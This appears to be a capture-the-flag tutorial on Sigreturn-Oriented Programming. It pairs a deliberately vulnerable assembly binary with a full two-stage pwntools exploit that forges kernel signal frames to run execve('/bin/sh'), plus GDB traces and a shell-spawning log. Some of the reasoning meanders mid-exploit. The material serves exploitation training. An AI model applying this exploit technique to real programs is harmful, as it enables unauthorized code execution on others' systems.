---
title: "Pwn - Sigreturn-Oriented Programming (SROP)"
description: "Abusing the kernel's signal return mechanism to set all registers at once — crafting fake sigframes to call execve when ROP gadgets are scarce."
author: "Zemi"
---

## Challenge Info

| Detail     | Value                                |
|------------|--------------------------------------|
| Category   | Binary Exploitation                  |
| Difficulty | Extreme                              |
| Points     | 550                                  |
| Flag       | `zemi{sr0p_k3rn3l_fr4m3_4bus3}`     |

## Challenge Files

Download the challenge files to get started:

- [srop.S](/Website/challenges/pwn-sigreturn-rop/srop.S)
- [Makefile](/Website/challenges/pwn-sigreturn-rop/Makefile)
- [flag.txt](/Website/challenges/pwn-sigreturn-rop/flag.txt)

## Prerequisites

Before attempting this challenge, you should have completed:

- **Pwn - Buffer Overflow** — stack layout fundamentals
- **Pwn - Shellcode Injection** — understanding syscalls and register setup
- **Pwn - ROP Chains** — building gadget chains and calling syscalls via ROP
- **Pwn - Stack Pivot** — understanding advanced stack manipulation

You need to understand how syscalls work on x86-64 Linux (registers for arguments, `syscall` instruction) and be comfortable with ROP. SROP is what you reach for when ROP alone is not enough.

## Introduction

Consider a binary that is tiny — maybe hand-written assembly, maybe heavily stripped. It has a buffer overflow, but there are almost no useful ROP gadgets. No `pop rdi; ret`. No `pop rsi; ret`. Maybe all you have is a `syscall; ret` and a `pop rax; ret`. With traditional ROP, you are stuck. You cannot set `rdi`, `rsi`, `rdx`, or any of the other registers needed for an `execve` syscall.

**SROP (Sigreturn-Oriented Programming)** solves this by abusing the Linux kernel's signal handling mechanism. When a signal is delivered to a process, the kernel saves **all** registers onto the stack in a structure called a **sigframe**. When the signal handler returns, the kernel calls `sigreturn` to restore all registers from that sigframe.

The key insight: **we can craft a fake sigframe on the stack and trigger `sigreturn` to load arbitrary values into every single register** — `rax`, `rdi`, `rsi`, `rdx`, `rsp`, `rip`, everything. One gadget (`sigreturn`) does the work of a dozen ROP gadgets.

## How Unix Signal Handling Works

### Normal Signal Flow

```
1. Signal arrives (e.g., SIGALRM, SIGSEGV)
2. Kernel interrupts the process
3. Kernel saves ALL registers to the process's stack (the "sigframe")
4. Kernel pushes a return address pointing to sigreturn
5. Kernel sets RIP to the signal handler function
6. Signal handler executes
7. Signal handler returns
8. sigreturn syscall executes
9. Kernel reads the sigframe from the stack
10. Kernel restores ALL registers from the sigframe
11. Process resumes from where it was interrupted
```

### What Gets Saved in the Sigframe

The sigframe (formally `struct ucontext` + `struct sigcontext`) contains:

```
+----------------------------------+
|  uc_flags                        |
+----------------------------------+
|  &uc_link                        |
+----------------------------------+
|  uc_stack (ss_sp, ss_flags,      |
|            ss_size)              |
+----------------------------------+
|  sigcontext:                     |
|    r8, r9, r10, r11              |
|    r12, r13, r14, r15            |
|    rdi, rsi, rbp, rbx            |
|    rdx, rax, rcx, rsp            |
|    rip, eflags                   |
|    cs, gs, fs, ss                |
|    err, trapno, oldmask          |
|    cr2                           |
|    fpstate pointer               |
+----------------------------------+
|  sigmask                         |
+----------------------------------+
|  FP state (if applicable)        |
+----------------------------------+
```

On x86-64 Linux, the total sigframe is around 248 bytes. Every general-purpose register is in there, plus the instruction pointer (`rip`), the stack pointer (`rsp`), and the flags register.

### The Abuse

If we can:
1. Place a fake sigframe on the stack with registers set to whatever we want
2. Execute the `sigreturn` syscall (syscall number 15 on x86-64)

Then the kernel will **dutifully restore all registers from our fake sigframe**, including `rip`. We control program execution and every register simultaneously.

To trigger `sigreturn`, we just need `rax = 15` and then execute `syscall`. That is two gadgets: `pop rax; ret` and `syscall; ret` (or `syscall` at the end of some existing code).

## Vulnerable Source Code

This challenge presents a minimal binary with almost no gadgets:

```c
#include <unistd.h>

// Compiled: gcc -fno-stack-protector -no-pie -nostdlib -static -o srop srop.s
// (We'll write this in assembly for minimal gadgets)
```

Here is the assembly source (`srop.s`):

```asm
.global _start

.section .text

_start:
    # call vuln
    call vuln
    # exit cleanly
    mov rax, 60        # sys_exit
    xor rdi, rdi
    syscall

vuln:
    # read(0, rsp, 0x400) — read directly onto the stack
    xor rax, rax       # sys_read = 0
    xor rdi, rdi       # fd = 0 (stdin)
    mov rsi, rsp       # buf = rsp
    mov rdx, 0x400     # count = 1024
    syscall
    ret

# A couple of gadgets that happen to exist:
gadgets:
    # pop rax; ret — needed to set rax = 15 for sigreturn
    pop rax
    ret
    # syscall; ret — needed to trigger sigreturn (and later execve)
    syscall
    ret
```

### Compilation

```bash
as -o srop.o srop.s
ld -o srop srop.o
```

Or equivalently:

```bash
gcc -nostdlib -no-pie -static -fno-stack-protector -o srop srop.s
```

### Gadget Inventory

Let's see what we have to work with:

```bash
$ ROPgadget --binary srop
Gadgets information
============================================================
0x0000000000401019 : pop rax ; ret
0x000000000040101b : syscall ; ret
0x000000000040101d : syscall
0x0000000000401007 : ret
...
(very few other gadgets)

Unique gadgets found: ~10
```

That is it. We have `pop rax; ret` and `syscall; ret`. There is **no** `pop rdi`, **no** `pop rsi`, **no** `pop rdx`. Traditional ROP is impossible. We cannot set the registers needed for `execve("/bin/sh", NULL, NULL)`:

```
rax = 59 (sys_execve)
rdi = pointer to "/bin/sh"
rsi = 0 (argv = NULL)
rdx = 0 (envp = NULL)
```

But with SROP, we only need `pop rax; ret` and `syscall; ret`. We set `rax = 15` (sigreturn), call `syscall`, and let the kernel set ALL registers from our fake sigframe.

## SROP vs Traditional ROP

| Aspect                | Traditional ROP                     | SROP                               |
|----------------------|-------------------------------------|--------------------------------------|
| Gadgets needed       | One per register (`pop rdi`, etc.)  | Just `pop rax; ret` + `syscall`     |
| Registers controlled | Only what gadgets are available for | ALL registers simultaneously         |
| Payload size         | Varies (many small gadgets)         | ~248 bytes (one sigframe)            |
| Complexity           | Find and chain many gadgets         | Build one sigframe structure         |
| When to use          | Plenty of gadgets available         | Very few gadgets, minimal binary     |

SROP is the technique of last resort for gadget-starved binaries. If you have `pop rdi; ret` and friends, normal ROP is simpler. But when you are staring at a binary with 10 total gadgets, SROP is your salvation.

## The Sigreturn Frame Layout (x86-64)

Here is the exact layout of the sigframe on x86-64 Linux, as defined in the kernel source (`arch/x86/include/uapi/asm/sigcontext.h`):

```
Offset  Field            Our Value        Purpose
------  -----            ---------        -------
0x00    uc_flags         0                (don't care)
0x08    &uc_link         0                (don't care)
0x10    uc_stack.ss_sp   0                (don't care)
0x18    uc_stack.ss_flg  0                (don't care)
0x20    uc_stack.ss_size 0                (don't care)
0x28    r8               0                (don't care)
0x30    r9               0                (don't care)
0x38    r10              0                (don't care)
0x40    r11              0                (don't care)
0x48    r12              0                (don't care)
0x50    r13              0                (don't care)
0x58    r14              0                (don't care)
0x60    r15              0                (don't care)
0x68    rdi              &"/bin/sh"       1st arg to execve
0x70    rsi              0                argv = NULL
0x78    rbp              0                (don't care)
0x80    rbx              0                (don't care)
0x88    rdx              0                envp = NULL
0x90    rax              59               sys_execve
0x98    rcx              0                (don't care)
0xa0    rsp              &"/bin/sh"+8     (safe writable addr)
0xa8    rip              &syscall         resume here after sigreturn
0xb0    eflags           0                (don't care)
0xb8    cs               0x33             user mode code segment
0xc0    gs               0                (don't care)
0xc8    fs               0                (don't care)
0xd0    ss               0x2b             user mode stack segment (sometimes needed)
...
```

After `sigreturn` executes, the kernel sets every register from this frame, then jumps to `rip`. So we set `rip = &syscall` — the kernel jumps to the `syscall` instruction, which now executes `execve("/bin/sh", NULL, NULL)` because all the registers are set up.

## Exploitation Walkthrough

### Step 1: Plan the Stack Layout

When `vuln` does `read(0, rsp, 0x400)`, it reads directly onto the stack starting from RSP. After the read, `ret` pops the first 8 bytes as the return address. So our payload layout starting from RSP is:

```
+---------------------------+  <- RSP (read starts here)
|  &(pop rax; ret)          |  <- popped by ret, starts our chain
+---------------------------+
|  15 (SYS_rt_sigreturn)    |  <- popped into rax
+---------------------------+
|  &(syscall; ret)          |  <- triggers sigreturn
+---------------------------+
|                           |
|  Fake Sigreturn Frame     |  <- kernel reads this as the signal frame
|  (248 bytes)              |
|    rdi = &"/bin/sh"       |
|    rsi = 0                |
|    rdx = 0                |
|    rax = 59               |
|    rip = &syscall         |
|                           |
+---------------------------+
|  "/bin/sh\x00"            |  <- the string itself (or use a fixed addr)
+---------------------------+
```

### Step 2: Where to Put "/bin/sh"

We need a pointer to the string `"/bin/sh"`. Options:
1. Put it at a known address in `.bss` or `.data` (if available)
2. Put it on the stack after the sigframe, and calculate the address

Since this is a static no-PIE binary, we can compute the address. But we need to know RSP. Since `vuln` reads starting at RSP, and we know the total offset of our string within the payload, we can use a two-stage approach:

Actually, let's use an even simpler approach. We'll put `"/bin/sh"` in a known writable section. Or we can use the SROP frame's `rsp` field — after `sigreturn`, RSP will be set to whatever we put in the frame. We can set RSP to point to a writable area so the process doesn't crash.

For this exploit, we will place `"/bin/sh"` at a known location in the binary's writable memory. Let's find a good spot:

```bash
$ readelf -S srop | grep -E "\.bss|\.data"
  [ 3] .bss              NOBITS  0000000000402000  001000  000000  00  WA  0   0  1
```

Wait — the `.bss` section has 0 size. Since this is a minimal assembly binary, there might not be a `.bss`. Let's use writable memory near the end of a writable segment:

```bash
$ readelf -l srop
  LOAD  0x000000  0x400000  0x400000  0x001000  0x001000  R E  0x1000
  LOAD  0x001000  0x401000  0x401000  0x000020  0x000020  RW   0x1000
```

Address `0x402000` region might be writable. Alternatively, we can write `"/bin/sh"` onto the stack itself. Since `vuln` reads to RSP, and we control the layout, we know exactly where our string will be. We need to calculate the absolute address of `"/bin/sh"` within our payload.

The simplest approach: do a **two-stage SROP**. First SROP calls `read(0, 0x402000, 0x100)` to write `"/bin/sh"` to a known writable address, then a second SROP calls `execve(0x402000, 0, 0)`.

But actually, the cleanest approach for a CTF is to place `"/bin/sh"` within the sigframe itself and reference it by stack address. Since we might not know RSP exactly due to ASLR of the stack, let's use a trick: the binary is statically linked with no PIE, so if we find ANY writable address we can use the first SROP to call `read()` and write there.

Let's go with the two-stage approach for maximum clarity:

### Step 3: Two-Stage SROP

**Stage 1**: Use SROP to call `read(0, writable_addr, 0x100)` to write `"/bin/sh\0"` plus a new payload to a known writable location, then return to `vuln` to do another read.

**Stage 2**: Use SROP to call `execve(writable_addr, 0, 0)`.

Actually, for simplicity and to fit in a clean writeup, let's use pwntools to calculate the stack address. In a local exploit with `process()`, we can leak RSP or just hardcode. But the cleanest pwntools approach uses `SigreturnFrame()` and puts "/bin/sh" at a known location.

Let me use the simplest possible approach: write "/bin/sh" to `.data` section (or any writable fixed address) using a read syscall via SROP, then do a second SROP for execve.

### Step 4: GDB Analysis

```bash
$ gdb -q ./srop
gef> break *vuln
gef> run
gef> info registers rsp
rsp   0x7fffffffe3a8

gef> x/gx 0x402000
0x402000: Cannot access memory at address 0x402000

# Let's find a writable page
gef> vmmap
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/user/srop
0x0000000000401000 0x0000000000402000 0x0000000000001000 rw- /home/user/srop

# 0x401000-0x402000 is RW. Let's use 0x401500 (well into the writable page)
gef> x/gx 0x401500
0x401500: 0x0000000000000000    # Perfect, writable and currently zero
```

We will use `0x401500` as our writable buffer for `"/bin/sh"`.

### Step 5: Full GDB Trace of SROP

```bash
gef> break *0x40101b    # break at syscall;ret
gef> continue

# After sending our Stage 1 payload:
gef> info registers rax
rax  0xf                 # 15 = SYS_rt_sigreturn

gef> si                  # execute syscall (sigreturn)

# After sigreturn, ALL registers are restored from our fake frame:
gef> info registers
rax  0x0                 # sys_read
rdi  0x0                 # fd = stdin
rsi  0x401500            # buf = writable address
rdx  0x100               # count = 256
rsp  0x401580            # safe writable area
rip  0x40101b            # &syscall (will execute read)

# The kernel set every register from our sigframe!
# Now syscall executes read(0, 0x401500, 0x100)
```

## Full Exploit

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

elf = ELF('./srop')

# Gadget addresses (no PIE — fixed)
pop_rax_ret   = 0x401019
syscall_ret   = 0x40101b
syscall_addr  = 0x40101b
vuln_addr     = 0x401007  # address of vuln function (adjust as needed)

# Writable address in the binary (in the RW LOAD segment)
writable = 0x401500

log.info(f"pop rax; ret  = {hex(pop_rax_ret)}")
log.info(f"syscall; ret  = {hex(syscall_ret)}")
log.info(f"writable area = {hex(writable)}")

p = process('./srop')

# ==========================================
# STAGE 1: SROP to call read(0, writable, 0x100)
#   This writes "/bin/sh\0" to a known address
#   After the read, we return to vuln to do another overflow
# ==========================================

# Build the sigreturn frame for read()
frame1 = SigreturnFrame()
frame1.rax = 0              # sys_read
frame1.rdi = 0              # fd = stdin
frame1.rsi = writable       # buf = writable address
frame1.rdx = 0x100          # count
frame1.rsp = writable + 0x10  # after read, RSP goes here (we'll set up a mini chain)
frame1.rip = syscall_addr   # execute syscall (read)

# The payload layout on the stack:
# [pop rax; ret]  <- returned to by vuln's ret
# [15]            <- sigreturn number
# [syscall; ret]  <- triggers sigreturn
# [sigframe...]   <- fake sigreturn frame
payload1  = p64(pop_rax_ret)
payload1 += p64(15)             # SYS_rt_sigreturn
payload1 += p64(syscall_ret)
payload1 += bytes(frame1)

log.info(f"Stage 1 payload: {len(payload1)} bytes")
p.send(payload1)

# Now the binary calls read(0, writable, 0x100)
# We send "/bin/sh\0" to the writable address
# But we also need to set up the stack at writable+0x10 for stage 2
# After the read syscall returns, RSP = writable + 0x10
# and RIP was set to syscall_addr, but after read returns, execution
# continues at RSP... wait, let me reconsider.

# After sigreturn restores registers, RIP = syscall_addr.
# syscall executes read(0, writable, 0x100).
# After read returns, rax = bytes read.
# syscall;ret — the ret pops from RSP (= writable + 0x10... but we set
# frame1.rsp = writable + 0x10, which is wrong because sigreturn sets
# RSP BEFORE execution starts. Let me think again.)

# Actually: sigreturn sets RSP = writable + 0x10, then sets RIP = syscall_addr.
# Execution jumps to syscall_addr. The gadget is "syscall; ret".
# syscall executes read(0, writable, 0x100). RSP is still writable + 0x10.
# After syscall returns, we hit "ret", which pops [writable + 0x10] into RIP.
# So we need to write our stage 2 chain at writable + 0x10!

# But wait — read() writes to writable (0x401500). writable + 0x10 is 0x401510.
# We write "/bin/sh\0" at writable (8 bytes), then padding (8 bytes to reach +0x10),
# then our stage 2 chain at offset 0x10.

# Stage 2 chain (written to writable + 0x10 via the read):
# [pop rax; ret]
# [15]
# [syscall; ret]
# [sigframe for execve]

frame2 = SigreturnFrame()
frame2.rax = 59             # sys_execve
frame2.rdi = writable       # filename = "/bin/sh"
frame2.rsi = 0              # argv = NULL
frame2.rdx = 0              # envp = NULL
frame2.rsp = writable       # doesn't matter much, just needs to be valid writable
frame2.rip = syscall_addr   # execute syscall (execve)

stage2  = b'/bin/sh\x00'    # offset 0x00 from writable
stage2 += b'\x00' * 8       # padding to reach offset 0x10
stage2 += p64(pop_rax_ret)  # offset 0x10 — popped by ret after read returns
stage2 += p64(15)           # SYS_rt_sigreturn
stage2 += p64(syscall_ret)  # triggers sigreturn
stage2 += bytes(frame2)     # fake sigframe for execve

log.info(f"Stage 2 payload: {len(stage2)} bytes")

# Small delay to ensure the read() syscall is waiting
import time
time.sleep(0.2)

p.send(stage2)

# Now sigreturn loads frame2:
#   rax = 59, rdi = &"/bin/sh", rsi = 0, rdx = 0
#   rip = syscall_addr => execve("/bin/sh", NULL, NULL)

log.success("Shell incoming!")
p.interactive()
```

### Running the Exploit

```bash
$ python3 exploit.py
[*] '/home/user/srop'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] pop rax; ret  = 0x401019
[*] syscall; ret  = 0x40101b
[*] writable area = 0x401500
[*] Stage 1 payload: 272 bytes
[*] Stage 2 payload: 280 bytes
[+] Shell incoming!
[*] Switching to interactive mode
$ cat flag.txt
zemi{sr0p_k3rn3l_fr4m3_4bus3}
```

## Deep Dive: Why sigreturn Works This Way

### The Kernel's Perspective

When the kernel delivers a signal, it needs to:
1. Interrupt the process at an arbitrary point
2. Run the signal handler
3. Perfectly resume the process as if nothing happened

To achieve step 3, the kernel saves the **entire CPU state** — all registers, flags, segment selectors — into a structure on the user's stack. After the handler runs, the kernel's `sigreturn` syscall reads this structure back and restores everything.

The critical security observation: **the kernel does not verify that the sigframe on the stack is one it actually created**. It just reads whatever is at RSP and restores it. There is no signature, no HMAC, no cookie. The kernel trusts the stack contents completely.

This is a fundamental design decision in Unix. The kernel cannot easily authenticate sigframes because the user process has full access to its own stack memory and could modify a legitimate sigframe anyway. So the kernel does not try.

### Why Not Just Use execve Directly?

You might ask: if we have `syscall; ret` and `pop rax; ret`, can't we just set `rax = 59` and do `syscall`?

No, because `execve` also needs `rdi` (filename), `rsi` (argv), and `rdx` (envp) set correctly. We have no `pop rdi; ret` gadget. We have no way to set those registers with traditional ROP.

SROP solves this because `sigreturn` sets ALL registers — including `rdi`, `rsi`, and `rdx` — from the sigframe. We only need to set `rax = 15` and call `syscall`, which our two gadgets can do.

## ASCII Diagram: Full SROP Execution Flow

```
    Stack (our payload)                     Execution
    ==================                      =========

    +-------------------+
    | pop rax; ret      | ---> RIP = pop_rax_ret
    +-------------------+       |
    | 15                |       +-> RAX = 15, then ret
    +-------------------+       |
    | syscall; ret      | <-----+  RIP = syscall_ret
    +-------------------+       |
    |                   |       +-> syscall with RAX=15
    | Fake Sigframe     |           = SYS_rt_sigreturn
    | +--------------+  |           |
    | | rdi = X      |  |           +-> Kernel reads sigframe
    | | rsi = 0      |  |               Sets ALL registers:
    | | rdx = 0      |  |                 RAX = 59
    | | rax = 59     |  |                 RDI = &"/bin/sh"
    | | rip = syscall|  |                 RSI = 0
    | | rsp = Y      |  |                 RDX = 0
    | +--------------+  |                 RIP = &syscall
    |                   |                 RSP = Y
    +-------------------+               |
                                        +-> syscall with RAX=59
                                            = SYS_execve
                                            execve("/bin/sh", 0, 0)
                                            |
                                            +-> SHELL!
```

## pwntools SigreturnFrame() Internals

The `SigreturnFrame()` class in pwntools handles all the struct layout details for you:

```python
from pwn import *
context.arch = 'amd64'

frame = SigreturnFrame()
frame.rax = 59
frame.rdi = 0x401500
frame.rsi = 0
frame.rdx = 0
frame.rip = 0x40101b
frame.rsp = 0x401500

# Convert to bytes
raw = bytes(frame)
print(f"Frame size: {len(raw)} bytes")   # 248 bytes on amd64
print(f"Hex dump:\n{hexdump(raw)}")
```

You can also set less common registers:

```python
frame.cs = 0x33       # User-mode code segment (usually needed)
frame.ss = 0x2b       # User-mode stack segment (sometimes needed)
frame.eflags = 0      # Clear all flags
```

On some kernel versions, incorrect `cs` or `ss` values cause a segfault after sigreturn. pwntools usually sets these correctly by default, but be aware this can be a source of failures.

## Common Pitfalls

### 1. Forgetting cs and ss Values

The sigframe must have valid segment selectors. On x86-64 Linux:
- `cs` must be `0x33` (user-mode 64-bit code segment)
- `ss` should be `0x2b` (user-mode stack segment)

If these are zero, the kernel may reject the sigreturn or the process segfaults immediately after. pwntools' `SigreturnFrame()` sets these by default, but double-check if things go wrong.

### 2. Setting RSP to an Invalid Address

After `sigreturn`, RSP is restored from the frame. If you set it to an unmapped address, the first stack operation (push, call, etc.) will segfault. Set RSP to a valid writable address, even if you plan to call `execve` (which replaces the process image anyway). A safe choice is any writable section of the binary.

### 3. Frame Size Mismatch

The sigframe size depends on the architecture:
- x86 (32-bit): different layout and syscall number (77 for sigreturn)
- x86-64: syscall number 15 for `rt_sigreturn`
- ARM, MIPS: completely different layouts

Always match the `context.arch` in pwntools to your target.

### 4. One-Shot vs. Two-Stage

If you need `"/bin/sh"` at a known address and don't have one in the binary, you need two stages (as shown above). But if the binary contains `"/bin/sh"` (e.g., in a string table or if libc is statically linked), you can do it in one shot.

```bash
$ strings -t x srop | grep /bin/sh
# If found, use that address directly in the sigframe
```

### 5. NX on the Stack

SROP does not require executable stack. The sigframe is just data — the kernel reads it and sets registers. The ROP chain portion (pop rax; syscall) executes from the binary's `.text` section, which is executable. NX is not a problem.

## Tools Used

| Tool          | Purpose                                          |
|---------------|--------------------------------------------------|
| as / ld       | Assemble and link the minimal binary             |
| checksec      | Verify binary protections                         |
| ROPgadget     | Find the precious few available gadgets           |
| GDB + GEF     | Trace sigreturn execution step by step           |
| pwntools      | Build SigreturnFrame and send the exploit        |
| readelf       | Find writable memory sections                    |
| strace        | Verify syscalls being made during exploitation   |

## Lessons Learned

1. **SROP is the ultimate "few gadgets" technique.** When you look at a binary and despair at the gadget list, check if you have `pop rax; ret` and `syscall`. That is all you need.

2. **The kernel trusts the stack blindly.** Sigreturn restores all registers from whatever is on the stack. There is no authentication. This is a fundamental Unix design decision.

3. **One sigreturn = one syscall.** Each sigreturn frame sets up registers for exactly one syscall. If you need multiple syscalls (read then execve), you need multiple SROP stages, chaining them by setting RSP and RIP appropriately in each frame.

4. **pwntools makes SROP easy.** The `SigreturnFrame()` class handles all the struct packing. Without it, you'd be manually placing values at exact byte offsets — error-prone and architecture-dependent.

5. **SROP combines beautifully with other techniques.** Use SROP to set up a `mprotect` call (making memory executable), then jump to shellcode. Use SROP to call `read` to load more data. The sigframe's `rsp` and `rip` fields let you chain multiple stages seamlessly.

6. **Understanding the kernel is a superpower.** SROP exists because of how the kernel handles signals. The more you understand about OS internals — syscalls, signal delivery, memory management — the more exploitation techniques become available to you.
